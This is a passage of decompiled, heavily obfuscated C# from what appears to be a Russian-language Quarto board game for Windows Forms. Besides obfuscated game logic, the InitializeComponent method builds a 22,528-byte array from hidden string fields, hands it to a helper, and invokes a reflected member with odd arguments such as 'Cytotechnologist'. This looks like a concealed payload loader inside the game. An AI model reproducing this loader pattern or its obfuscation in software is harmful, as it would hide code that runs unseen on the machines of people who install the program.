					goto IL_0481;
				case 51u:
				{
					int num67;
					int num68;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num67 = 1433713632;
						num68 = 1433713632;
					}
					else
					{
						num67 = 1251717191;
						num68 = 1251717191;
					}
					num = num67 ^ ((int)num2 * -310002923);
					continue;
				}
				case 50u:
					if (mem[0, 3] != null)
					{
						num = 508137461;
						continue;
					}
					goto IL_017b;
				case 49u:
					flag3 = num3 < 4;
					num = 1954381433;
					continue;
				case 48u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1214693854) ^ -595527363;
						continue;
					}
					goto IL_0187;
				case 47u:
				{
					int num59;
					int num60;
					if (mem[2, 2] == null)
					{
						num59 = -1066879593;
						num60 = -1066879593;
					}
					else
					{
						num59 = -1383936005;
						num60 = -1383936005;
					}
					num = num59 ^ ((int)num2 * -732201996);
					continue;
				}
				case 46u:
					flag = true;
					num = ((int)num2 * -1236746892) ^ 0x7E80E82F;
					continue;
				case 45u:
				{
					int num48;
					int num49;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num48 = -1497001282;
						num49 = -1497001282;
					}
					else
					{
						num48 = -453731615;
						num49 = -453731615;
					}
					num = num48 ^ (int)(num2 * 1014518371);
					continue;
				}
				case 44u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)(num2 * 504685255) ^ -209875297;
						continue;
					}
					goto IL_02d7;
				case 43u:
				{
					int num40;
					int num41;
					if (mem[num3, 1].Square != mem[num3, 2].Square)
					{
						num40 = 1192428912;
						num41 = 1192428912;
					}
					else
					{
						num40 = 1863976609;
						num41 = 1863976609;
					}
					num = num40 ^ ((int)num2 * -535636186);
					continue;
				}
				case 42u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1871146584) ^ 0x421E39E2;
						continue;
					}
					goto IL_025f;
				case 41u:
					num3++;
					num = ((int)num2 * -933220148) ^ 0x517E1BA4;
					continue;
				case 40u:
				{
					int num30;
					int num31;
					if (flag3)
					{
						num30 = 847260222;
						num31 = 847260222;
					}
					else
					{
						num30 = 1111318072;
						num31 = 1111318072;
					}
					num = num30 ^ (int)(num2 * 1063841226);
					continue;
				}
				case 39u:
				{
					int num28;
					int num29;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num28 = -1026599794;
						num29 = -1026599794;
					}
					else
					{
						num28 = -1978967646;
						num29 = -1978967646;
					}
					num = num28 ^ (int)(num2 * 1736413193);
					continue;
				}
				case 38u:
					num10 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_001b;
				case 37u:
				{
					int num21;
					int num22;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num21 = -297957315;
						num22 = -297957315;
					}
					else
					{
						num21 = -705112160;
						num22 = -705112160;
					}
					num = num21 ^ (int)(num2 * 1488628682);
					continue;
				}
				case 36u:
				{
					int num20;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 1651688143;
						num20 = 1651688143;
					}
					else
					{
						num = 451682488;
						num20 = 451682488;
					}
					continue;
				}
				case 35u:
					flag = false;
					num = (int)(num2 * 1697934992) ^ -789193961;
					continue;
				case 34u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -1995244556) ^ -1754881646;
						continue;
					}
					goto IL_025f;
				case 33u:
				{
					int num8;
					int num9;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num8 = -314647435;
						num9 = -314647435;
					}
					else
					{
						num8 = -884428918;
						num9 = -884428918;
					}
					num = num8 ^ (int)(num2 * 612861909);
					continue;
				}
				case 32u:
				{
					int num5;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 919000836;
						num5 = 919000836;
					}
					else
					{
						num = 65069790;
						num5 = 65069790;
					}
					continue;
				}
				case 31u:
					flag = true;
					num = (int)((num2 * 264644816) ^ 0x39F3DAC5);
					continue;
				case 30u:
					if (mem[2, 1].Square != mem[3, 0].Square)
					{
						goto IL_017b;
					}
					goto IL_0187;
				case 29u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -1444492798) ^ 0x1102550F;
						continue;
					}
					goto IL_0187;
				case 28u:
				{
					int num65;
					int num66;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num65 = -754455887;
						num66 = -754455887;
					}
					else
					{
						num65 = -233446924;
						num66 = -233446924;
					}
					num = num65 ^ (int)(num2 * 990060217);
					continue;
				}
				case 27u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)((num2 * 1833840501) ^ 0x73E291F3);
						continue;
					}
					goto IL_0187;
				case 26u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -118196836) ^ 0x36162E4C;
						continue;
					}
					goto IL_0187;
				case 25u:
				{
					int num63;
					int num64;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num63 = -1620998478;
						num64 = -1620998478;
					}
					else
					{
						num63 = -875964060;
						num64 = -875964060;
					}
					num = num63 ^ (int)(num2 * 1804997333);
					continue;
				}
				case 24u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = ((int)num2 * -128394120) ^ -471642504;
						continue;
					}
					goto IL_0481;
				case 23u:
				{
					int num57;
					int num58;
					if (mem[1, num3].Dark != mem[2, num3].Dark)
					{
						num57 = 870305002;
						num58 = 870305002;
					}
					else
					{
						num57 = 1326290654;
						num58 = 1326290654;
					}
					num = num57 ^ (int)(num2 * 1724771479);
					continue;
				}
				case 21u:
				{
					int num53;
					int num54;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num53 = -741986923;
						num54 = -741986923;
					}
					else
					{
						num53 = -245480913;
						num54 = -245480913;
					}
					num = num53 ^ ((int)num2 * -125458695);
					continue;
				}
				case 20u:
				{
					int num46;
					int num47;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num46 = -405278208;
						num47 = -405278208;
					}
					else
					{
						num46 = -22200104;
						num47 = -22200104;
					}
					num = num46 ^ ((int)num2 * -1535786388);
					continue;
				}
				case 19u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = (int)(num2 * 326663542) ^ -2035041242;
						continue;
					}
					goto IL_025f;
				case 18u:
				{
					int num42;
					int num43;
					if (mem[num3, 3] != null)
					{
						num42 = 639396032;
						num43 = 639396032;
					}
					else
					{
						num42 = 601630326;
						num43 = 601630326;
					}
					num = num42 ^ (int)(num2 * 2140662709);
					continue;
				}
				case 17u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)((num2 * 1140440777) ^ 0x3A81857A);
						continue;
					}
					goto IL_0481;
				case 16u:
					result = flag;
					num = 186279944;
					continue;
				case 15u:
				{
					int num38;
					int num39;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num38 = -1138037671;
						num39 = -1138037671;
					}
					else
					{
						num38 = -727475122;
						num39 = -727475122;
					}
					num = num38 ^ (int)(num2 * 325897423);
					continue;
				}
				case 14u:
				{
					int num32;
					int num33;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num32 = 843880308;
						num33 = 843880308;
					}
					else
					{
						num32 = 583505435;
						num33 = 583505435;
					}
					num = num32 ^ (int)(num2 * 759710601);
					continue;
				}
				case 13u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -287832091) ^ 0x4D49AB94;
						continue;
					}
					goto IL_0187;
				case 12u:
					if (mem[1, num3] != null)
					{
						num = (int)((num2 * 369862458) ^ 0x40F913DA);
						continue;
					}
					goto IL_001a;
				case 11u:
				{
					int num26;
					int num27;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num26 = -1404031429;
						num27 = -1404031429;
					}
					else
					{
						num26 = -509817058;
						num27 = -509817058;
					}
					num = num26 ^ (int)(num2 * 419631373);
					continue;
				}
				case 10u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1004484927) ^ -1633041305;
						continue;
					}
					goto IL_0187;
				case 9u:
				{
					int num23;
					int num24;
					if (flag2)
					{
						num23 = -304403717;
						num24 = -304403717;
					}
					else
					{
						num23 = -949316852;
						num24 = -949316852;
					}
					num = num23 ^ (int)(num2 * 276052959);
					continue;
				}
				case 8u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)((num2 * 625810474) ^ 0x7904C629);
						continue;
					}
					goto IL_017b;
				case 7u:
					num = ((int)num2 * -1028761522) ^ -1049699611;
					continue;
				case 6u:
				{
					int num16;
					int num17;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num16 = 21827924;
						num17 = 21827924;
					}
					else
					{
						num16 = 1256154149;
						num17 = 1256154149;
					}
					num = num16 ^ ((int)num2 * -322311134);
					continue;
				}
				case 5u:
				{
					int num14;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 1803762183;
						num14 = 1803762183;
					}
					else
					{
						num = 1984671451;
						num14 = 1984671451;
					}
					continue;
				}
				case 4u:
				{
					int num11;
					int num12;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num11 = 1805965479;
						num12 = 1805965479;
					}
					else
					{
						num11 = 1672204933;
						num12 = 1672204933;
					}
					num = num11 ^ ((int)num2 * -328085325);
					continue;
				}
				case 3u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -1132797390) ^ 0x2F6CA461;
						continue;
					}
					goto IL_0187;
				case 2u:
				{
					int num6;
					int num7;
					if (mem[3, 3] != null)
					{
						num6 = -1421462948;
						num7 = -1421462948;
					}
					else
					{
						num6 = -555276817;
						num7 = -555276817;
					}
					num = num6 ^ ((int)num2 * -547448750);
					continue;
				}
				case 1u:
				{
					int num4;
					if (mem[num3, 0].Point == mem[num3, 1].Point)
					{
						num = 11497784;
						num4 = 11497784;
					}
					else
					{
						num = 1091911418;
						num4 = 1091911418;
					}
					continue;
				}
				case 0u:
					break;
				default:
					{
						return result;
					}
					IL_0481:
					num10 = 1;
					goto IL_001b;
					IL_017b:
					num = 541999959;
					num15 = 541999959;
					continue;
					IL_025f:
					num10 = 1;
					goto IL_001b;
					IL_001b:
					flag2 = (byte)num10 != 0;
					num = 1720409242;
					continue;
					IL_001a:
					num10 = 0;
					goto IL_001b;
					IL_0187:
					num = 182744779;
					num15 = 182744779;
					continue;
					IL_02d7:
					num10 = 0;
					goto IL_001b;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool result = default(bool);
		bool flag = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		int num8 = default(int);
		bool flag3 = default(bool);
		while (true)
		{
			int num = 573878721;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6242A386u) % 16u)
				{
				case 15u:
					num = ((int)num2 * -620028501) ^ 0x6D1441;
					continue;
				case 13u:
					result = flag;
					num = ((int)num2 * -449861323) ^ 0x290B6128;
					continue;
				case 12u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = -1610822978;
						num7 = -1610822978;
					}
					else
					{
						num6 = -1668842064;
						num7 = -1668842064;
					}
					num = num6 ^ (int)(num2 * 282347604);
					continue;
				}
				case 11u:
					num3++;
					num = 1899917975;
					continue;
				case 10u:
					num3 = 0;
					num = 1778957141;
					continue;
				case 9u:
					num8 = 0;
					num = ((int)num2 * -2136578642) ^ -2014752323;
					continue;
				case 8u:
				{
					int num9;
					if (mem[num8, num3] == null)
					{
						num = 1211855062;
						num9 = 1211855062;
					}
					else
					{
						num = 1754937997;
						num9 = 1754937997;
					}
					continue;
				}
				case 7u:
					flag = true;
					num = (int)(num2 * 1666472201) ^ -1788122976;
					continue;
				case 6u:
					num8++;
					num = ((int)num2 * -822305242) ^ 0x49E3C4A7;
					continue;
				case 5u:
					flag3 = num8 < 4;
					num = 1997558962;
					continue;
				case 4u:
				{
					int num4;
					int num5;
					if (flag3)
					{
						num4 = -1607858628;
						num5 = -1607858628;
					}
					else
					{
						num4 = -1253553925;
						num5 = -1253553925;
					}
					num = num4 ^ (int)(num2 * 490013772);
					continue;
				}
				case 3u:
					num = (int)(num2 * 122884977) ^ -1999901516;
					continue;
				case 1u:
					flag2 = num3 < 4;
					num = 914879978;
					continue;
				case 0u:
					flag = false;
					num = (int)((num2 * 198584055) ^ 0x4D52F8BD);
					continue;
				case 14u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = 1916452685;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF34025u) % 7u)
				{
				case 6u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 282438143) ^ -1058460887;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1261730923) ^ 0x5232B1BD;
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1346912266) ^ 0x373DC293;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 1852152530) ^ 0x8DBF738);
					continue;
				case 1u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -27271104) ^ 0xD839B11;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = -1295265121;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x8F9ECD82u) % 9u)
				{
				case 8u:
					if (disposing)
					{
						num = ((int)num2 * -504121369) ^ -201417062;
						continue;
					}
					goto IL_001b;
				case 7u:
					num = (int)(num2 * 715923740) ^ -17585428;
					continue;
				case 6u:
					if (components != null)
					{
						num = -603221760;
						num3 = -603221760;
						continue;
					}
					goto IL_001b;
				case 5u:
					num = ((int)num2 * -1585941924) ^ 0x5D95C78E;
					continue;
				case 4u:
					num = ((int)num2 * -628147149) ^ -768376211;
					continue;
				case 3u:
					Form1.smethod_51((IDisposable)components);
					num = (int)((num2 * 1898796617) ^ 0x6D60F7D1);
					continue;
				case 0u:
					((Form)this).Dispose(disposing);
					num = -740367220;
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
					IL_001b:
					num = -1497035210;
					num3 = -1497035210;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0a0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a19: Expected O, but got Unknown
		int num3 = default(int);
		string string_ = default(string);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = 1555429351;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x494D8ADAu) % 121u)
				{
				case 120u:
					num = ((int)num2 * -1198215568) ^ -1525132137;
					continue;
				case 119u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 1458387486) ^ 0x355FD98);
					continue;
				case 117u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -1661475170) ^ 0x76F2F7EB;
					continue;
				case 116u:
					num = (int)((num2 * 481242560) ^ 0xC4DFFB);
					continue;
				case 115u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 923404836) ^ 0x50EA86E3);
					continue;
				case 114u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 963272452) ^ 0x73C7DD64);
					continue;
				case 113u:
					num = (int)(num2 * 60827623) ^ -60826198;
					continue;
				case 112u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)((num2 * 1103476715) ^ 0x271C0430);
					continue;
				case 111u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					num = (int)((num2 * 483606567) ^ 0x6E404F9E);
					continue;
				case 110u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 863135618) ^ -1372889294;
					continue;
				case 109u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1362642238) ^ 0x4C8B41C7;
					continue;
				case 108u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -1060544913) ^ 0x1D5D6E4D;
					continue;
				case 107u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1290125152) ^ -164647103;
					continue;
				case 106u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1816203541) ^ 0x849584C;
					continue;
				case 105u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)((num2 * 1479132280) ^ 0x7F3C053);
					continue;
				case 104u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)(num2 * 582130689) ^ -1594144237;
					continue;
				case 103u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -322045863) ^ -78376204;
					continue;
				case 102u:
					num = ((int)num2 * -2003673149) ^ -45676390;
					continue;
				case 101u:
					num = (int)(num2 * 1892342869) ^ -1962514544;
					continue;
				case 100u:
					num = 951149971;
					continue;
				case 99u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1349222381) ^ -612417131;
					continue;
				case 98u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)(num2 * 1753538473) ^ -400824288;
					continue;
				case 97u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -1677624294) ^ 0x15052071;
					continue;
				case 96u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1189297554) ^ 0x383F1F6E;
					continue;
				case 95u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					Form1.smethod_32((Control)(object)this, "Quarto");
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1376026773) ^ 0x1FC3E179;
					continue;
				case 94u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -2064062321) ^ 0x63198483;
					continue;
				case 93u:
					string_ = Veet.Sa;
					num = (int)((num2 * 703903096) ^ 0x5F42DB21);
					continue;
				case 92u:
					num = (int)((num2 * 1564753953) ^ 0x5C972471);
					continue;
				case 91u:
					num = (int)((num2 * 1927131900) ^ 0x2C92A740);
					continue;
				case 90u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -316794771) ^ 0x26FEADB0;
					continue;
				case 89u:
					num = (int)(num2 * 1399267088) ^ -23764338;
					continue;
				case 88u:
					num = ((int)num2 * -499856223) ^ -2077505998;
					continue;
				case 87u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -1533153184) ^ 0x873853C;
					continue;
				case 86u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -356260459) ^ 0x3BA859F8;
					continue;
				case 85u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 221639341) ^ 0x152FD697);
					continue;
				case 84u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1173409114) ^ 0x4B89B4F6;
					continue;
				case 83u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1131026624) ^ 0x47C40B91;
					continue;
				case 82u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)(num2 * 1091689156) ^ -1544007513;
					continue;
				case 81u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 601180498) ^ 0x3ECB9A21);
					continue;
				case 80u:
					num = (int)(num2 * 1733575341) ^ -716681460;
					continue;
				case 79u:
					num = ((int)num2 * -328020905) ^ 0x62BCC41E;
					continue;
				case 78u:
					num = (int)((num2 * 436314340) ^ 0x5A0D21CB);
					continue;
				case 77u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 777074293) ^ -698988754;
					continue;
				case 76u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 1037557917) ^ -630352485;
					continue;
				case 75u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 206195954) ^ 0x2C483C2A);
					continue;
				case 74u:
					num = (int)((num2 * 1341324692) ^ 0x1FC0EB0A);
					continue;
				case 73u:
					num = (int)(num2 * 1442413770) ^ -1999049274;
					continue;
				case 72u:
					num = ((int)num2 * -2119686773) ^ 0x114BE17A;
					continue;
				case 71u:
					num = (int)((num2 * 991182741) ^ 0x35EE6DB5);
					continue;
				case 70u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1351236221) ^ 0x4C4B2B44;
					continue;
				case 69u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1304850774) ^ 0x75B95517;
					continue;
				case 68u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -23853341) ^ 0x558E0E9F;
					continue;
				case 67u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 2072285914) ^ 0x726AE2B6);
					continue;
				case 66u:
					num = (int)((num2 * 1998351510) ^ 0x7F4F12EA);
					continue;
				case 65u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)(num2 * 1132877259) ^ -1977466037;
					continue;
				case 63u:
					num = ((int)num2 * -154631174) ^ -629444768;
					continue;
				case 62u:
					Form1.smethod_72(timer1, 1000);
					num = (int)((num2 * 604888080) ^ 0x1621D803);
					continue;
				case 61u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)(num2 * 1007282979) ^ -1195968517;
					continue;
				case 60u:
					num = ((int)num2 * -941296811) ^ -397500393;
					continue;
				case 59u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 2020365223) ^ 0x7C5CC3BC);
					continue;
				case 58u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)(num2 * 1615602843) ^ -539658127;
					continue;
				case 57u:
					num3++;
					num = ((int)num2 * -2051566291) ^ 0x661E7816;
					continue;
				case 56u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)(num2 * 364261532) ^ -1054356525;
					continue;
				case 55u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -1575362658) ^ -289623010;
					continue;
				case 54u:
					num = (int)((num2 * 1303858729) ^ 0x6D6281E2);
					continue;
				case 53u:
					button2 = Form1.smethod_53();
					num = (int)((num2 * 268411831) ^ 0x3A574B90);
					continue;
				case 52u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 1466591783) ^ -1718845260;
					continue;
				case 51u:
					label5 = Form1.smethod_57();
					num = (int)((num2 * 951660789) ^ 0x1756F068);
					continue;
				case 50u:
					num = ((int)num2 * -478306951) ^ 0x2B47F479;
					continue;
				case 49u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1566245082) ^ -1672241729;
					continue;
				case 48u:
				{
					int num4;
					if (num3 >= 22528)
					{
						num = 444996740;
						num4 = 444996740;
					}
					else
					{
						num = 742406274;
						num4 = 742406274;
					}
					continue;
				}
				case 47u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num3 = 0;
					num = (int)((num2 * 394256629) ^ 0x7AC64F8);
					continue;
				case 46u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -394174886) ^ 0x6BF57870;
					continue;
				case 45u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 2053546266) ^ 0x78B7343);
					continue;
				case 44u:
					num = ((int)num2 * -654150720) ^ -1393801770;
					continue;
				case 43u:
					num = (int)((num2 * 1852337711) ^ 0x13BCD2F7);
					continue;
				case 42u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -1433693200) ^ -1993312012;
					continue;
				case 41u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)(num2 * 1559986844) ^ -334861306;
					continue;
				case 40u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)((num2 * 498036993) ^ 0x3EF5F271);
					continue;
				case 39u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -125335291) ^ 0x41393B36;
					continue;
				case 38u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -2033615601) ^ -623223522;
					continue;
				}
				case 37u:
					num = ((int)num2 * -277206800) ^ -232045243;
					continue;
				case 36u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -287662138) ^ 0x6150610D;
					continue;
				case 35u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -14119618) ^ -1587366617;
					continue;
				case 34u:
					num = (int)(num2 * 675591244) ^ -17437044;
					continue;
				case 33u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -297369436) ^ 0x30517EE8;
					continue;
				case 32u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)((num2 * 1056003898) ^ 0x15F23208);
					continue;
				case 31u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -103899746) ^ -134970176;
					continue;
				case 30u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1038227783) ^ 0x1D286040;
					continue;
				case 29u:
					num = ((int)num2 * -1914382761) ^ 0x50CE2FA2;
					continue;
				case 28u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -1655373418) ^ -375036301;
					continue;
				case 27u:
					button1 = Form1.smethod_53();
					num = (int)(num2 * 163033888) ^ -1468524034;
					continue;
				case 26u:
					num = (int)(num2 * 493548496) ^ -2050204208;
					continue;
				case 25u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -805285583) ^ -1261944029;
					continue;
				case 24u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 1652197926) ^ -2048639383;
					continue;
				case 23u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1240334318) ^ 0x42747762;
					continue;
				case 22u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)((num2 * 48473864) ^ 0x51312DA7);
					continue;
				case 21u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)((num2 * 1025459751) ^ 0x25AEED5A);
					continue;
				case 20u:
					num = (int)(num2 * 1388392117) ^ -244654622;
					continue;
				case 19u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 599817513) ^ -2102014208;
					continue;
				case 18u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1551875566) ^ -1690656349;
					continue;
				case 17u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1608322198) ^ 0x9857B8E;
					continue;
				case 16u:
					label2 = Form1.smethod_57();
					num = ((int)num2 * -782293225) ^ 0x42D698C4;
					continue;
				case 15u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -1113749535) ^ 0x4C291F8F;
					continue;
				case 14u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)((num2 * 469520594) ^ 0x6A64DD1C);
					continue;
				case 13u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)((num2 * 1333179764) ^ 0x7D975C5A);
					continue;
				case 12u:
					num = (int)((num2 * 1358840935) ^ 0x27ABA67);
					continue;
				case 11u:
					num = (int)((num2 * 1439481665) ^ 0x746402E9);
					continue;
				case 10u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -1179568729) ^ 0x4D812AB9;
					continue;
				case 9u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
